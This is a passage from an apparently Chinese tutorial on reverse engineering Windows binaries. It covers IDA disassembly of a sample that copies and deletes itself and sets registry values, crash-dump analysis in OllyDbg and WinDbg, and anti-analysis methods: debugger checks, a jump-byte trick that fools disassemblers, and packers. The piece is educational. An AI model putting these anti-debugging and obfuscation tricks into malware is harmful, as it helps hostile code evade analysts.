<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040143</span><span class="n">A</span>                 <span class="k">call</span>    <span class="n">ebx</span> <span class="c">; CopyFileA</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040143</span><span class="n">C</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">858</span><span class="n">h</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401440</span>                 <span class="k">lea</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">1</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401443</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401443</span> <span class="n">loc_401443</span><span class="o">:</span>                             <span class="c">; CODE XREF: sub_401380+C8j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401443</span>                 <span class="k">mov</span>     <span class="n">cl</span><span class="p">,</span> <span class="p">[eax]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401445</span>                 <span class="k">inc</span>     <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401446</span>                 <span class="k">test</span>    <span class="n">cl</span><span class="p">,</span> <span class="n">cl</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401448</span>                 <span class="k">jnz</span>     <span class="n">short</span> <span class="n">loc_401443</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040144</span><span class="n">A</span>                 <span class="k">sub</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">edx</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040144</span><span class="n">C</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; cbData</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040144</span><span class="n">D</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">85</span><span class="n">Ch</span><span class="o">+</span><span class="n">pszPath</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401451</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; lpData</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401452</span>                 <span class="k">call</span>    <span class="n">sub_401310</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401457</span>                 <span class="k">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040145</span><span class="n">A</span>                 <span class="k">call</span>    <span class="n">sub_401220</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040145</span><span class="n">F</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; nExitCode</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401461</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">PostQuitMessage</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401467</span>                 <span class="k">jmp</span>     <span class="n">loc_40151F</span>
</code></pre></div></div>

<p>IDA会显示出调用的函数名和参数。<code class="highlighter-rouge">00401452</code>处的<code class="highlighter-rouge">SetRegValue</code>函数以及<code class="highlighter-rouge">0040145A</code>处的SelfDelete函数，它们分别用来注册表值以及自身删除。</p>

<p>在notepad++中编写汇编代码（扩展名为asm），使用<a href="http://nasm.us">NASM汇编器</a>编译成obj文件，再用<a href="http://alink.sourceforge.net/download.html">ALINK</a>编译成exe文件。</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">extern</span> <span class="n">MessageBoxA</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="kr">global</span> <span class="n">main</span>

<span class="n">main</span><span class="o">:</span>
	<span class="k">push</span> <span class="n">dword</span> <span class="mi">0</span>
	<span class="k">push</span> <span class="n">dword</span> <span class="n">title</span>
	<span class="k">push</span> <span class="n">dword</span> <span class="n">text</span>
	<span class="k">push</span> <span class="n">dword</span> <span class="mi">0</span>
	<span class="k">call</span> <span class="n">MessageBoxA</span>
	<span class="k">ret</span>
	
<span class="kr">section</span> <span class="p">.</span><span class="n">data</span>
<span class="n">title</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">MessageBox</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="n">text</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Hello</span> <span class="n">World</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span>

</code></pre></div></div>

<p><img src="/img/interestingBin/1488957716297.png" alt="Alt text" /></p>

<p>函数调用的过程如下：</p>
<ul>
  <li>要显示的消息：Hello，World！</li>
  <li>要显示的消息框标题：MessageBox</li>
  <li>将参数按照从后往前的顺序入栈</li>
  <li>用call MessageBoxA调用函数</li>
</ul>

<p>该exe程序在OD的显示情况：</p>

<p><img src="/img/interestingBin/1488958231316.png" alt="Alt text" /></p>

<h2 id="内存转储和反调试">内存转储和反调试</h2>

<h3 id="内存转储">内存转储</h3>

<h4 id="获取内存转储">获取内存转储</h4>

<p>随着程序的运行，内存中的数据会不断实时变化，如果保存某个时间点的状态(快照)，就需要内存转储。
内存转储是用于系统崩溃时，将内存中的数据转储保存在转储文件中，供给有关人员进行排错分析用途。而它所保存生成的文件就叫做内存转储文件。</p>

<p><strong>1. 在windows vista以上版本生成内存转储:</strong></p>
<ul>
  <li>打开任务管理器</li>
  <li>右键点击目标进程名称</li>
  <li>选择“创建转储文件”</li>
</ul>

<p><img src="/img/interestingBin/1488961482669.png" alt="创建转储文件" /></p>

<p><img src="/img/interestingBin/1488961552492.png" alt="Alt text" /></p>

<blockquote>
  <p>尽管操作系统会按照可执行文件中的内容将程序加载到内存中，但内存中的数据与可执行文件中的数据并不安全相同</p>
</blockquote>

<p><strong>2.在windows xp及以下的版本系统生成内存转储</strong></p>

<p>在运行中输入Drwatson，或者是在附件-&gt;系统工具-&gt;系统信息中打开Drwatson，生成内存转储文件和日志。</p>

<p><img src="/img/interestingBin/1488964523913.png" alt="Alt text" /></p>

<p>日志记载了崩溃的应用程序名称、崩溃发生时间、用户名、操作系统版本以及其他正在运行的进程列表等全局信息。从错误的代码可以看出是，对内存非法访问。</p>

<p>接下来的模块清单中，记载了崩溃时，进程所加载的模块，从中可以确认每个模块各自映射的内存地址。</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">错误</span> <span class="o">-&gt;</span><span class="mi">004012</span><span class="n">bf</span> <span class="mi">668911</span>           <span class="k">mov</span>     <span class="p">[ecx],</span><span class="n">dx</span>              <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">00000000</span><span class="o">=????</span>
        <span class="mi">004012</span><span class="n">c2</span> <span class="mi">8</span><span class="n">b4d08</span>           <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
        <span class="mi">004012</span><span class="n">c5</span> <span class="mi">50</span>               <span class="k">push</span>    <span class="n">eax</span>
        <span class="mi">004012</span><span class="n">c6</span> <span class="mi">51</span>               <span class="k">push</span>    <span class="n">ecx</span>
        <span class="mi">004012</span><span class="n">c7</span> <span class="n">ff15a8204000</span>     <span class="k">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">guitest</span><span class="o">+</span><span class="mh">0x20a8</span> <span class="p">(</span><span class="mi">004020</span><span class="n">a8</span><span class="p">)</span><span class="err">]</span>
        <span class="mi">004012</span><span class="n">cd</span> <span class="n">b801000000</span>       <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>
        <span class="mi">004012</span><span class="n">d2</span> <span class="mi">5</span><span class="n">d</span>               <span class="k">pop</span>     <span class="n">ebp</span>
        <span class="mi">004012</span><span class="n">d3</span> <span class="n">c21000</span>           <span class="k">ret</span>     <span class="mh">0x10</span>
        <span class="mi">004012</span><span class="n">d6</span> <span class="mi">3</span><span class="n">b0d00304000</span>     <span class="k">cmp</span>     <span class="n">ecx</span><span class="p">,</span><span class="err">[</span><span class="n">guitest</span><span class="o">+</span><span class="mh">0x3000</span> <span class="p">(</span><span class="mi">00403000</span><span class="p">)</span><span class="err">]</span>
        <span class="mi">004012</span><span class="n">dc</span> <span class="mi">7502</span>             <span class="k">jnz</span>     <span class="n">guitest</span><span class="o">+</span><span class="mh">0x12e0</span> <span class="p">(</span><span class="mi">004012</span><span class="n">e0</span><span class="p">)</span>
        <span class="mi">004012</span><span class="n">de</span> <span class="n">f3c3</span>             <span class="kr">rep</span>     <span class="k">ret</span>
</code></pre></div></div>

<blockquote>
  <p>在地址<code class="highlighter-rouge">004012bf</code>的mov指令旁边写着一个“错误字样”，mov[ecx],dx 这条指令的功能是将dx的值写入ecx所代表的内存地址中。查看寄存器，发现ecx的值为00000000，将数据写入00000000的地址会引起崩溃。</p>
</blockquote>

<h4 id="有效运行实时调试">有效运行实时调试</h4>

<p>在OllyDbg的菜单中点击Options-&gt;Just-in-time debugging，会弹出一个设置对话框。点击“Make OllyDbg just-in-time debugger”按钮，OllyDbg就会将自己的信息配置到上述注册表项目中。</p>

<p><img src="/img/interestingBin/1488981072395.png" alt="设置OD为实时调试器" /></p>

<p>将OD设置为实时调试器之后，再一次运行该会崩溃的程序。这次程序崩溃后，OD会自动打开，挂载到崩溃的进程上。（<strong>管理员运行会崩溃的程序，OD才会自动被打开</strong>）</p>

<p>实时调试对于处理一些难以重新的Bug非常有效。</p>

<h4 id="通过转储文件寻找出错原因">通过转储文件寻找出错原因</h4>

<p>当程序崩溃时，最好能够在第一时间启动调试器，但有些情况无法做到这一点。这时候，只要留下转储文件，也能通过它找到出错的原因。</p>

<p>转储文件可以使用WinDbg来分析。</p>

<p>打开WinDbg，然后按Ctrl+D或者点击菜单中的File-&gt;Open Crash Dump，打开转储文件。</p>

<p><img src="/img/interestingBin/1488982085948.png" alt="Alt text" /></p>

<p>WinDbg虽然有图形界面，但实际上却更像是一个命令行工具，因为它基本上是通过命令交互来进行调试。因此，和OD相比，WinDbg更难上手，但有些情况只能用WinDbg。例如，64位程序以及运行在内核领域的程序。</p>

<p>第一次启动只有一个command窗口，从view菜单可以显示更多的窗口。</p>

<ul>
  <li><strong>Alt+6:显示Call Stack(调用栈)窗口</strong></li>
  <li><strong>Alt+7:显示Disassembly(反汇编)窗口</strong></li>
</ul>

<p>调用栈：
<img src="/img/interestingBin/1488982549799.png" alt="调用栈" />
反汇编窗口：
<img src="/img/interestingBin/1488982573470.png" alt="反汇编" /></p>

<p>这里本来应该显示反汇编之后的代码，但由于EIP值为00000000,因此此处是一对问号，这就表示“出于某些原因，程序跳转到<code class="highlighter-rouge">00000000</code>这个值”</p>

<p>追溯一下函数调用的过程。从Call Stack窗口中可以看到：</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0003044c 00000111 00000001 guitest2+0x12d0
</code></pre></div></div>
<p>双击这一行，再看下Disassembly窗口，这时候会显示处<code class="highlighter-rouge">guitest2+0x12d0</code>地址的内容。</p>

<p><img src="/img/interestingBin/1488985307660.png" alt="Alt text" /></p>

<p>当前显示的地址是<code class="highlighter-rouge">004012d0</code>，我们看一下前一条指令<code class="highlighter-rouge">call eax</code>，按Alt+4可以查看寄存器的值。</p>

<p><img src="/img/interestingBin/1489025129943.png" alt="寄存器值" /></p>

<p>eax寄存器的值是<code class="highlighter-rouge">00000000</code>,也就是说，<code class="highlighter-rouge">004012ce</code>的这条call eax指令调用了00000000这个地址，这个就是引起崩溃的原因。</p>

<p>地址<code class="highlighter-rouge">004012c8</code>处也执行了一条call指令，由于返回值会存放在<code class="highlighter-rouge">eax</code>中，因此可以推测，eax的00000000是从这来的。
按<code class="highlighter-rouge">Alt+5</code>打开Memory(内存窗口)，在显示Virtual的地方输入<code class="highlighter-rouge">00402004</code></p>

<p>在显示Virtual的地方输入“00402004”</p>

<p>地址00402004的值为04240000(=00002404)</p>

<p>这里显示的的值是相对于基地址的偏移量，因此再输入<code class="highlighter-rouge">00400000+2404</code>，这时会显示出调用的函数名称，即<code class="highlighter-rouge">GetProcAddress</code>.</p>

<p><img src="/img/interestingBin/1489025726105.png" alt="Alt text" /></p>

<p>相同的，地址004012bc所call的函数是LoadLibraryW
<img src="/img/interestingBin/1489027563784.png" alt="Alt text" /></p>

<p>将内存窗口确认下调用这些函数所传递的参数，将汇编代码改成更易懂 的形式。</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">004012</span><span class="n">b7</span> <span class="mi">6844214000</span>      <span class="k">push</span>     <span class="s">"kernel31.dll"</span>
<span class="mi">004012</span><span class="n">bc</span> <span class="n">ff1500204000</span>    <span class="k">call</span>    <span class="n">LoadLibraryW</span>
<span class="mi">004012</span><span class="n">c2</span> <span class="mi">6860214000</span>      <span class="k">push</span>    <span class="s">"GetCurrentProcessID"</span>
<span class="mi">004012</span><span class="n">c7</span> <span class="mi">50</span>              <span class="k">push</span>    <span class="n">eax</span>
<span class="mi">004012</span><span class="n">c8</span> <span class="n">ff1504204000</span>    <span class="k">call</span>    <span class="n">GetProcAddress</span>
<span class="mi">004012</span><span class="n">ce</span> <span class="n">ffd0</span>            <span class="k">call</span>    <span class="n">eax</span>
<span class="mi">004012</span><span class="n">d0</span> <span class="mi">8</span><span class="n">b4d08</span>          <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span>
<span class="mi">004012</span><span class="n">d3</span> <span class="mi">0</span><span class="n">fb7c6</span>          <span class="k">movzx</span>   <span class="n">eax</span><span class="p">,</span><span class="n">si</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">LoadLibraryW</code>函数的参数为kernel31.dll，但实际上系统中没有 kernel31.dll这个DLL文件，因此LoadLibraryW函数会调用失败。到这里程序还没有崩溃，但后面的GetProcAddress函数也会调用失败。随后，失败的GetProcAddress函数返回了00000000，于是<code class="highlighter-rouge">call eax</code>时进程就异常终止。</p>

<p>通过分析转储文件，可以找到一些导致意外错误的原因并进行修改。</p>

<blockquote>
  <p>Windows、Linux、Mac OSX等一般的主流操作系统中都具备内存转储和调试等帮助软件分析的功能。利用此功能可以实现其他的一些好的或坏的目的。</p>
</blockquote>

<blockquote>
  <p>JAVA具有跨平台性，采用了两种技术。在编译时，源码会被编译成字节。各种环境分别安装能够解释和执行字节码的虚拟机。对Java编写的程序进行分析，实际上是就相当于对Java的字节码进行分析。有一些工具能够将字节码还原成源码，这些工具称为反编译工具。相比x86汇编语言，Java字节码更容易还原成源码。</p>
</blockquote>

<h3 id="防止软件被人分析">防止软件被人分析</h3>

<h4 id="反调试技术">反调试技术</h4>

<h5 id="isdebuggerpresent">IsDebuggerPresent</h5>
<p>IsDebuggerPresent是一种能够检测是否挂载了调试器的API函数，通过返回值是否为0可以判断调试器的挂载状态。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
	<span class="k">if</span><span class="p">(</span><span class="n">IsDebuggerPresent</span><span class="p">()){</span>
		<span class="c1">//在调试器运行
</span>		<span class="n">printf</span><span class="p">(</span><span class="s">"on debugger</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="c1">//在调试器不运行
</span>	<span class="n">printf</span><span class="p">(</span><span class="s">"not on debugger</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>若希望在开发时方便调试，又要在发布之后防止破解，这一函数非常有用。在开发时，用ifdef或者注释来暂时禁用IsDebuggerPresent的调用，在发布版本再启用，再检测到调试器时改变程序逻辑。</p>
</blockquote>

<p>除外还有其他类似的API函数，如<code class="highlighter-rouge">CheckRemoteDebuggerPresent</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">CheckRemoteDebuggerPresent</span><span class="p">(</span>
	<span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span>
	<span class="n">_Inout_</span> <span class="n">PBOOL</span> <span class="n">pbDebuggerPresent</span>
<span class="p">);</span>
</code></pre></div></div>

<p>除了API函数，还有很多技术可以用于检测调试器。比如<code class="highlighter-rouge">anti-debug popf</code>和”anti-debug int2d”。</p>

<ul>
  <li>利用popf和SINGLE_STEP异常来检测调试器的方法。当返回值为0时为正常，为1则表示挂载了调试器。</li>
  <li>利用<code class="highlighter-rouge">int 2dh</code>，当返回值为0是正常，为1表示挂载了调试器。</li>
</ul>

<h5 id="通过代码混淆防止分析">通过代码混淆防止分析</h5>

<p>若用了反汇编器进行静态分析，找到检测调试器逻辑(例如调用IsDebuggerPresent地方)，就可以轻易破解反调试器技术。用调试器从头开始追踪，也能找到检测调试器的逻辑。</p>

<p>例如：</p>

<p>调用IsDebuggerPresent的部分，其机器语言代码为<code class="highlighter-rouge">FF 15 00 20 40 00 85 C0 74 17</code>(截至到jz指令)</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">00401000</span>					<span class="n">main</span> <span class="n">proc</span> <span class="n">near</span>
<span class="mi">00401000</span> <span class="n">FF</span> <span class="mi">15</span> <span class="mi">00</span> <span class="mi">20</span> <span class="mi">40</span> <span class="mi">00</span>  <span class="k">call</span> <span class="n">ds</span><span class="o">:</span><span class="n">__imp__IsDebuggerPresent</span><span class="err">@</span><span class="mi">0</span>
<span class="mi">00401006</span> <span class="mi">85</span> <span class="n">C0</span>				<span class="k">test</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
<span class="mi">00401008</span> <span class="mi">74</span> <span class="mi">17</span> 				<span class="k">jz</span> <span class="n">short</span> <span class="n">loc_401021</span>
</code></pre></div></div>

<p>在此，若再前面增加一个EB，即变成<code class="highlighter-rouge">EB FF 15 00 20 40 00 85 C0 74 17</code>,在IDA显示的代码就会变成：</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FF</span> <span class="mi">15</span> <span class="mi">00</span> <span class="mi">20</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">85</span> <span class="n">C0</span> <span class="mi">74</span> <span class="mi">17</span>
</code></pre></div></div>

<p>此处的指令变成了jmp、adc、test、jz，而call指令消失了，然而这段机器语言的实际功能却没有发生变化，因为EB FF相当于向前跳转1个字节，也就是跳转到00401001。
而00401001后面的机器语言代码为FF 15 00 20 40 00 85 C0 74 17，这段代码反汇编之后得到的指令是call、test、jz，因此call依然能够正常执行。</p>

<p>这里的关键点就是00401001处的FF，它可以当作前面jmp指令的一部分，也可以当作后面call指令的一部分。而IDA会从前往后按顺序进行反汇编，因此显示出的代码可能会和实际执行的代码不同。</p>

<blockquote>
  <p>可阅读代码混淆的优秀论文。比如<a href="https://www2.cs.arizona.edu/solar/papers/CCS2003.pdf">Obfuscation of Executable Code to Improve Resistance to
Static Disassembly </a>和<a href="https://www2.cs.arizona.edu/solar/papers/obf-signal.pdf">Binary Obfuscation Using Signals</a></p>
</blockquote>

<h5 id="将可执行文件压缩">将可执行文件压缩</h5>
<p>除了反调试和混淆，用打包器将可执行文件压缩防止软件分析，压缩之后依然可以运行。</p>

<p>打包器最有名的是叫做<a href="https://github.com/upx/upx">UPX</a>的，支持EIF、DLL、COFF等多种可执行文件格式。</p>

<p><strong>打包器的原理非常简单，就是将原本可执行文件中的代码和数据进行压缩，然后将解压缩的代码放在前面，运行的时候先将原本的可执行数据解压缩出来，然后再运行解压缩后的数据。</strong></p>

<p>也有一些打包器的目的不是压缩，而是反调试(防止逆向工程)。比如<a href="http://www.aspack.com/">ASPack</a>.</p>

<p><strong>剖析例子：</strong>
源码如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"$packed.exe &lt;password&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span><span class="p">(</span><span class="n">IsDebuggerPresent</span><span class="p">()){</span>
		<span class="c1">// 在调试器上运行
</span>		<span class="n">printf</span><span class="p">(</span><span class="s">"on debugger</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="c1">// 不在调试器上运行
</span>		<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"unpacking"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"correct!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"auth error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>该程序简单，首先它会调用<code class="highlighter-rouge">IsDebuggerPresent</code>检测调试器是否存在。然后向程序传参数为“unpacking”这个字符串，则显示correct，否则auth error。</p>
</blockquote>

<p>编译源码后，使用IDA看：</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span> <span class="n">_main</span>           <span class="n">proc</span> <span class="n">near</span>               <span class="c">; CODE XREF: ___tmainCRTStartup+11Dp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span> <span class="n">argc</span>            <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">8</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span> <span class="n">argv</span>            <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">0</span><span class="n">Ch</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span> <span class="n">envp</span>            <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">10</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span>                 <span class="k">push</span>    <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401001</span>                 <span class="k">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401003</span>                 <span class="k">cmp</span>     <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">argc</span><span class="err">]</span><span class="p">,</span> <span class="mi">2</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401007</span>                 <span class="k">jge</span>     <span class="n">short</span> <span class="n">loc_401028</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401009</span>                 <span class="k">push</span>    <span class="n">offset</span> <span class="n">Format</span>   <span class="c">; "$packed.exe &lt;password&gt;\n"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040100</span><span class="n">E</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">__iob_func</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401014</span>                 <span class="k">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">40</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401017</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; File</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401018</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">fprintf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040101</span><span class="n">E</span>                 <span class="k">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401021</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401026</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401027</span>                 <span class="k">retn</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401028</span> <span class="c">; ---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401028</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401028</span> <span class="n">loc_401028</span><span class="o">:</span>                             <span class="c">; CODE XREF: _main+7j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401028</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">IsDebuggerPresent</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040102</span><span class="n">E</span>                 <span class="k">test</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401030</span>                 <span class="k">jz</span>      <span class="n">short</span> <span class="n">loc_401045</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401032</span>                 <span class="k">push</span>    <span class="n">offset</span> <span class="n">aOnDebugger</span> <span class="c">; "on debugger\n"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401037</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">printf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040103</span><span class="n">D</span>                 <span class="k">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">4</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401040</span>                 <span class="k">or</span>      <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">FFFFFFFFh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401043</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401044</span>                 <span class="k">retn</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401045</span> <span class="c">; ---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401045</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401045</span> <span class="n">loc_401045</span><span class="o">:</span>                             <span class="c">; CODE XREF: _main+30j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401045</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">argv</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401048</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040104</span><span class="n">B</span>                 <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span> <span class="n">offset</span> <span class="n">aUnpacking</span> <span class="c">; "unpacking"</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401050</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401050</span> <span class="n">loc_401050</span><span class="o">:</span>                             <span class="c">; CODE XREF: _main+6Aj</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401050</span>                 <span class="k">mov</span>     <span class="n">dl</span><span class="p">,</span> <span class="p">[eax]</span>
